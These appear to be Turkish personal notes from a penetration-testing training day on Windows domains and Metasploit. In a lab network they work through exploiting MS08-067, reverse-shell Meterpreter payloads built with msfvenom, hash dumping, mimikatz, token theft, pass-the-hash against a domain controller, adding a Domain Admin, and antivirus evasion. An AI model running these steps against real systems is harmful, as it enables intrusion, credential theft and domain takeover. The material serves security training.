# Gün 3
Bir domain controller olur ve windows clientler bu dc'ye direk olarak bağlıdır. Sistem yöneticisi tüm clientleri dc'den yönetir. Bir domain groupunda hak kontrolü olur. Bir networkde birden fazla DC olabilir. Örneğin siberkamp.local, bga.local diye 2 DC yapıp, clientler farklı domainlere bağlanır. Bİrden fazla domain varsa birden fazla DC olur. DC Domain Admin yetkisine sahiptir. En yüksek yetki Enterprise Admins'dir.(Domain Controller)

System, Local Service, Network Service. Domain Controllerda admin olan biri, DC'ye bağlı olan tüm clientlerde de admindir. (user: name\vinar -> name host nameli sunucuda vinar kullanıcısı) netuser ile Network kullanıcıları alabiliriz. Diğer userlar Local kullanıcılardır.

`net user bgasecurity`, `bgasecurity` kullanıcısı ile ilgili tüm bilgileri getirir. (Yetkileri, Password expire vs.)

Bir windows'a sızdığımızda elde etmek istediğimiz şey System grubundan bir kullanıcı yetkisidir.

Network Service User -> Read yapabilen, port dinleyen vs. üyelikler
Local Service User -> Belli yerlere Write/Read izni olan üyelikler
System User -> Herşeyi yapabilir.

## PenTest
Exploit etmek için Core Impact, Immunity Canvas, Metasploit Framework kullanabiliriz. İncelememiz gereken binlerce ip olursa, günlerce nmap yapıp elle bakmak yerine bu işlemi otomatik yapmamıza gerek var. Örneğin Nesus ile bu taramayı yapabiliriz.

4 Metaspolit modülü vardır
`Auxiliary` Yardımcı araçlar. Bilgi toplama aşaması öncesi ve sonrası işe yarıcak modüller.
`Exploit` Zayifet istismar edicek modüller.
`Payload` Exploit tetiklendikten sonra saldırganın olmasını istediğini gerçekleştiren kodlar.
`Post` Exploitation sonrası auxiliary ile birlikte kullanılabilecek modüller. Sistem hakkında daha geniş blgi edinmek vs. Windows bir sunucuya eriştikten sonra, DNS ipsini bulmak için örneğin.

Meterpreter -> Tüm işletim sistemlerinde çalışabilen, modüler yapılı üst düzey bir payloaddır.
Msfvenom -> Meterpreter'ın spesifik halleri yani meterpreterı belirli payloadları içerisinde barından ve istenen formatta çıktısını veren araç. Encoding özelliğide vardır.

Microsoft üzerinde tüm zayifetlerin kodu vardır.
MS15-034 -> Microsoftda 2015'de çıkan 34 numaralı zayifet anlamında.
Metaspolitde arama yaparken alt tire ile arama yaparız MS15_034

## Metaspolit
`search {MODUL_ADI}` -> modülü metasploit modüllerinde arar.

anonymous ftp var mı yok mu bulmak:
`nmap -n -sP 192.168.102.0/24 -oN lab.lab` 192.168.102.(0-255) arası port scan yapıp sonuçları lab.lab'a kaydeder. Buradan ipleri alarak metaspolit ile scan yapabiliriz.

```
msfconsole içinde ->
	use auxiliary/scanner/ftp/anonymous
	info # bilgileri görebilirsiniz. Metasploit exploitlerinin rankları vardır.
	show options # modülün istediği parametreleri gösterir. bazıları varsayılan olarak gelir. Zorunlu olanları required'da yes yazar.
	set RHOSTS file://home/yengas/lab.txt # File url olarak RHOSTS'u ver ve hepsine tek tek bağlanılsın. Buraya yine address range ve CIDR identifierda verilir.
	set FTPPASS anonymous # FTPPASS parametresini anonymous yap. Ama ftp scanner için yapmazsan daha iyi. Çünkü bazı FTP sunucular mail adresi istiyor.
	set VERBOSE true # Debug output ver
	run #  modülü çalıştırır. `exploit`de aynı işi yapar
```
Örneğin msfconsole sonrasında 192.168.102.221 diye bir sunucuda anonymous ftp bulduk.
```
ftp 192.168.102.221 # yazdık ve bilgilerimizi girdik, username anonymous, password mail adresi gibi.
ls # dosyaları listeledik
get welcome.png # welcome.png'yi indirdik.
```
ftp write izni açıksa ve sunucunun ftp klasörü ile webserver ile aynı klasöre bakıyorsa, buraya bir shell atıp çalıştırabiliriz.

`nmap-n -Pn -sV -v --open 192.168.102.227` 227 ipli sunucuyu taradık ve portlarına baktık. Eğer windows/linux tarzında portlar açıksa bunları farkedebiliriz. RDP olduğunu farkedelim.
`rdesktop 192.168.102.227` sunucuya uzaktan bağlanır. üyelik ister.

```
ls /usr/share/nmap/scrits | grep sbm # smb ile ilgili nmap scriptlerine bak
nmap 192.168.102.227 --script smb-vuln-ms08-067.nse # ms08-067 scripti ile portları kontrol et, bulduğumuzu varsayalım
# msfconsole içinde
	use exploit/windows/smb/ms08_067_netapi
	show tartgets # exploit targetlayabildiği makineleri göster.
	show payloads # exploitin suncuuda çalıştırabildiği payloadları gösterir. payload seçmezseniz default olarak çoğu zaman reverse tcp olur.
	set RHOST 192.168.102.227
	set payload windows/meterpreter/reverse_tcp # sunucuda çalıştırılacak payload olarak meterpreter ve bağlantı yöntem olarak reverse tcp seç
	set LHOST 192.168.102.143 # kend ip'in
	exploit
	
	# Meterpreter olunca
		getuid # hangi kullanıcı yetkisinde olduğumuzu öğren, nt authority olduğumuzu düşünelim.
		ps # processleri listele, mümkünse winlogon exe'ye migrate ol, birden fazla varsa pid en düşük olana migrate ol.
		ps -S winlo # process listde winlo ile başlayan processleri ara
		mirage 360 # 360 pidli process'e değiştir.
		pwd # sistemde neredeyiz
		lpwd # meterpreter çalıştıran yerde neredeyiz. kendi komutlarımızı başına l(for local) ekliyerek yazarız.
		screenshot # meterpreter target sistemde screenshot alıp, bize gönderir
		hashdump # sistem userlarını ve şifrelerini listeler username:userid:lmhash:nthash tarzındadır. userid 500 -> admin, 501 -> guest, userlar 1000'den başlar. hashin sonu 89c0 ise hesabın ya parolası yoktur yada disableddır.
		load mimikatz # mimikatz yükle clear text pass almak için
		wdigest # wdigest üzerinden clear text parola almayı dene.
		load incognito
		list_tokens -u
		background # meterpreter'ı backgrounda at.
	back
	sessions -l # meterpreter sessionlarımızı listeler
	use auxiliary/scanner/smb/smb_login # smb_login denemesi yapmak için kullanılan modül
	set RHOSTS 192.168.102.0/24 # Bu subnette tarama yapılacak
	set SMBUser Administrator
	set SMBPass hash # hash meterpreter oturumu ile hashdump'dan elde ettiğimiz hash.
	exploit # burada tüm ağ tarandı ve belirttiğimiz credentiallar ile giriş yapılmaya çalışıldı.
	use post/windows/gather/enum_domain
	set SESSION 5 # hangi session ile network hakkında bilgi edineceğimizi öğrenelim 
	exploit # sunucunun domainini ve dc ipsini öğrendik
	use auxiliary/scanner/smb/psexec_loggedin_users
	show options
	set SMBPASS hash
	set SMBUSER Administrator
	set SMBDOMAIN workgroup
	set RHOSTS file://home/yengas/ip.list
	exploit # psexec ile loggedin userlardan domain controllerı bulduktan sonra psexec ile kendimizi domain controllera giriş yaptıralım
	use exploit/windows/smb/psexec
	set SMBUser Administrator
	set SMBPass hash
	set rhost 192.168.102.223 # Domain controller ipsi
	exploit # Dc'ye bağlan
	# Meterpreter içinde ->
		shell # meterpreter'dan işletim sistemi shell'i spawn eder
		add_user siberKamp Siber123!! -h 192.168.102.140 # remote host'da yeni bir user oluştur. Bonus trick: şifre politikalarından dolayı doğru düzgün bir şifre girmen gerekli. Dümdüz user olur bu arkadaş. Domain adminlerden birinin rastgele delegation tokenını kullanır.
		add_localgroup_user Administrator siberKamp -h 192.168.102.240 # Domain admin yetkisi veriyoruz. Meterpreterın payloadları ikiye ayrılır. Staged ve Non-Staged. Non stagedler exploiti trigger eden meterpreterlardır. Örneğin reverse tcp için sunucuya gönderdiğimiz bize belli bir portdan bağlanan payloaddır. Daha sonra bu payload bize bağlandığında 2. bir payload (staged) payload göndeririz.
		net group "Domain Admins" /domain # Domain adminleri listele
		background # meterpreter'ı background'a atar
	sessions -l # sessionları listeler
	sessions -i 1 # 1. sessiona geçer
```
Bu işlemlerden sonra dc makneye girip kullanıcı access ayarlarından kullanıcıyı Member Of sekmesinden Domain Admins grubuna eklememiz ve bu grubu öncelikli grup olarak belirlememiz gerekir.

Meterpreter ile hashdump yapıp windows parolalarını aldıktan sonra, windows dcler ile tokenbased işlem yaptığı için, şifrenin cleartext halini almak ile uğraşmadan işlem yapabiliriz.

Meterpreter 32 bit olarak kullanırsanız, 64 bit bir processe migrate ederek 64 bit gibi çalışabilirsiniz.
mimikatz ile bazı sistemlerde cleartext parola alamıyorsunuz.

Cleartext parolalar memoryden gider, tokenlar uzun ömürlüdür. Bu tokenları almak için incognito kullanabiliriz.

Tokenlar ile pass the hash yöntemi ile diğer sunuculara zıplayabiliriz.

smb_login auxiliary kullanırken şirket policylerinden dolayı bir kaç brute force attacktan sonra ban yiyebilirsiniz. boş şifre ve aynı zaman username, pass aynı olduğu durumlarda da ban yiyebilirsiniz.

bir sunucuya giriş yaparken .\ koyarsak user başına, local değil domain'e giriş yapmayı deneriz. eğer user local ise giriş başarısız olur.

```
# Standalone ms08-067 exploit 
	nmap -n -pN -sV -p 445 -v 192.168.102.227 # 227 ipli sunucuyu scan et.
	python ms.py 192.168.102.227 2 # ms.py 08-067 exploit eden, 4444 portunda cmd bind eden bir payload upload eden scripti çalıştırır.
	telnet 192.168.102.227 4444
	# cmd içinde
		net user # lists users
		net group "Domain Admins" /domain # domain üzerindeki Domain Admins listesini DC üzerinden listelese.
```

### MSFVENOM
```
msfvenom -l # barındırılan tüm payloadları listeleyebilirsiniz.
msfvenom -p windows/meterpreter/reverse_tcp --payload # payloadı seç ve bizden istediklerini söyle
msfvenom -p windows/meterpreter/reverse_tcp -o file.exe lhost=192.168.102.221 -f exe # meterpreter reverse_tcp'yi 192.168.102.221:443 bağlanıcak şekilde exe olarak compile et

# Metasploit içinde
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST kendi.ip.im.iz
	set LPORT 1337
	exploit -j -z # arkada çalışıcak şekilde multi handlerı çalıştırır ve tüm exploiti yiyen makineler size bağlanabilir
	sessions -l # size bağlı exploitleri gösterir
```

### Antivirüsler
Antivirüsler 2 şekilde çalışır. İmza ve Hareket tabanlı. Bir dosya bir hedefe geldiğinde antivürüsler dosyanın sha256 imzasına bakar. Ayrıca aktif olarak inceler. Bir dosyanın port açmaması lazım. Memoryde kendini bir yere inject ediyor mu? Oluşturduğu text clear text ise imzaya bakar. 

Hardcore yöntem: 443 portundan reverse tcp yapan meterpreter exesini letsencryptden aldığın sertifikalı sunucuya bağla
Cave Injection: Programın boş olan kısmına shell komutu gömme.
`smbexec` meterpreter ve exploit/multi/handler için rc script oluşturan bir program.	

### Senaryo
- FTP ve HTTP aynı dizine bakıyor. Anonymous FTP login var. -> Sunucuya shell at, meterpreter at ve çalıştır
- Reverse TCP connection ile Low Access'de çalışıyoruz. -> Cleartext veri elde etmeye çalış ve metasploit exploitleri dene.

Halil Dalabasmaz MSSQL varsa hackleyebilirsin: exploit-db'den oku.
